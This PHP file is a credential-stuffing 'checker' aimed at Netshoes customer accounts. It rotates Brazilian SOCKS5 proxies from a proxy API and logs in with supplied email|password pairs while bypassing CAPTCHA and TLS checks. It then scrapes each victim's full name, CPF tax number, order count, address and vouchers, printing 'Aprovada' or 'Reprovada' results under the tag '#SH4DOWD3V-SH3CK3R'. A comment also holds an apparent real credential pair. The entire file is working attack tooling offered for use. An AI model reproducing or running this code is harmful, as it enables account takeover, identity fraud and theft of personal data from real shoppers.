<?php 
session_start();
 if(!$_SESSION['user'] == "paladino" and !$_SESSION['pass'] == "paladino"){  
   echo "<script>location.href='../'</script>";
 }
set_time_limit(0);

extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$email = $separar[0];
preg_match('/[a-z]+@/', $email, $find);
if(!$find){
unset($email);
unset($senha);
}
$senha = $separar[1];


function checkProxy($proxy) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.cpanel.net/showip.cgi");
    curl_setopt($ch, CURLOPT_TIMEOUT, 20);
    curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $result = curl_exec($ch);
    if ($result !== FALSE) {
        return true;
    } else {
        return false;
    }
    curl_close($ch);
}

function getProxy() {

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://gimmeproxy.com/api/getProxy?api_key=0351ecb4-4ede-41b5-bb05-e2a81fbdfed6&protocol=socks5&country=BR');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/ml.txt');
    curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/ml.txt');
    $proxy = curl_exec($ch);
    $proxy = json_decode($proxy);

    return $proxy->ipPort;
}

//yeray.keiton@carins.io|renato@123
function getCpf($dados){
    preg_match_all('#<input[^>]*>(.*?)#', $dados, $string);
    $cpf = $string[0][7];
    $exp = explode("=", $cpf);
    $exp = explode('"', $exp[5]);
    $cpf = $exp[1];
    return $cpf;
}
function fullName($dados){
    preg_match_all('#<input[^>]*>(.*?)#', $dados, $string);
    $name = $string[0][3];
    $lastName = $string[0][4];
    
    $exp1 = explode('"', $lastName);
    $exp = explode("=", $name);
    $exp = explode('"', $exp[7]);
    
    $lastName = $exp1[11];
    $name = $exp[1];
    return strtoupper($name." ".$lastName);
}

function getStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function getString($string,$start,$end,$value){
    $str = explode($start,$string);
    $str = explode($end,$str[$value]);
    return $str[0];
}
$dir = dirname(__FILE__);
$config['cookie_file'] = $dir . '/cookies/' . md5($_SERVER['REMOTE_ADDR']) . '.txt';
if (!file_exists($config['cookie_file'])) {
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}

function delete_cookies() {
    global $config;
    $fp = @fopen($config['cookie_file'], 'w');
    @fclose($fp);
}

function xflush() {
    static $output_handler = null;
    if ($output_handler === null) {
        $output_handler = @ini_get('output_handler');
    }
  
   if ($output_handler == 'ob_gzhandler') {
        return;
    }
    
    flush();
    if (function_exists('ob_flush') AND function_exists('ob_get_length') AND ob_get_length() !== false) {
        @ob_flush();
    } else if (function_exists('ob_end_flush') AND function_exists('ob_start') AND function_exists('ob_get_length') AND ob_get_length() !== FALSE) {
        @ob_end_flush();
        @ob_start();
    }
}


if(file_exists(getcwd().'/netshoes.txt')) {
        unlink(getcwd().'/netshoes.txt'); 
    }



delete_cookies();

$ch = curl_init();
$proxy = getProxy();
while (!checkProxy($proxy)) {
    $proxy = getProxy();
}
curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/login");
curl_setopt($ch, CURLOPT_PROXY, trim($proxy));
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
$request_headers = array();
$request_headers[] = 'Host: www.netshoes.com.br';
$request_headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:51.0) Gecko/20100101 Firefox/51.0';
$request_headers[] = 'Accept: text/javascript, text/html, application/xml, text/xml, */*';
$request_headers[] = 'Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3';
$request_headers[] = 'Accept-Encoding: gzip, deflate, br';
$request_headers[] = 'Referer: https://www.netshoes.com.br/login';
$request_headers[] = 'X-NewRelic-ID: VQEHV15UChAGV1JQAwQCUA==';
$request_headers[] = 'Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0';
curl_setopt($ch, CURLOPT_HTTPHEADER, $request_headers);
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'username='.urlencode($email).'&password='.$senha.'&recaptchaResponse=');
$home = curl_exec($ch);

flush();
xflush();

curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$conta = curl_exec($ch);

flush();
xflush();

curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-vouchers");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$vale_compras = curl_exec($ch);


flush();
xflush();

curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-orders");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$pedidos = curl_exec($ch);


curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-addresses");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$cidade = curl_exec($ch);




curl_setopt($ch, CURLOPT_URL, "https://www.netshoes.com.br/account/my-personal-info");
curl_setopt($ch, CURLOPT_HEADER, 1);
curl_setopt($ch, CURLOPT_NOBODY, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIESESSION, false );
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/netshoes.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
$dados = curl_exec($ch);
$data = date("d/m/Y H:i:s");
if ($conta) {
    $loadtime = time();
    if (stristr($conta, "Sair") !== false ) {
        //===  Pega numero de pedidos ===\\
        $num_pedidos = 0;
        preg_match('/<td class="cell">(.*)<\/td>/', $pedidos, $matches);
        foreach ($matches as $key) {
            $num_pedidos++;
        }
        //=== Pega Cidade ==\\
        $matches = array();
        preg_match_all('#<div[^>]*>(.*?)</div>#', $cidade, $matches2);
        $cidade1 = $matches2[0][33];
        $cidade1 = str_replace("Cidade:", "", $cidade1);
        //=== Pega Dados ===\\
        if (strpos($dados, 'Dados Cadastrais') !== false) {   

        $fullName = fullName($dados);
        $cpf = getCpf($dados);
       

        }
            //=== Pega Vale ===\\
            if (stristr($vale_compras, "Você não possui vales-compra.") == !false) {
                $cupom = "Não";
                }else{
                    $cupom = "Sim";
                }

                if ($num_pedidos == 0) {
                    $num_pedidos = "Sem pedidos";
                }

         echo '<span style="width:100% !important" class="label label-success">#Aprovada ✅ '.$email . ' | '.$senha.' | Informaçoes |</br> Nome: ' . $fullName.' | Cpf: '.$cpf.' | Pedidos: '.$num_pedidos.' | Tem cupom? '.$cupom.' | PROXY :  '. $proxy . '(' . (time() - $loadtime) .  ' seg) | DATA: '.$data. ' |</br> #SH4DOWD3V-SH3CK3R<br> </span> <br>';

    }else{
        
         echo '<span class="label label-danger">#Reprovada - Bloqueado ❌ '. $email .' | '. $senha .' | PROXY :  '. $proxy . '(' . (time() - $loadtime) .  ' seg) | DATA: '.$data. ' |  #SH4DOWD3V-SH3CK3R<br></span>';
    }
}
    
?>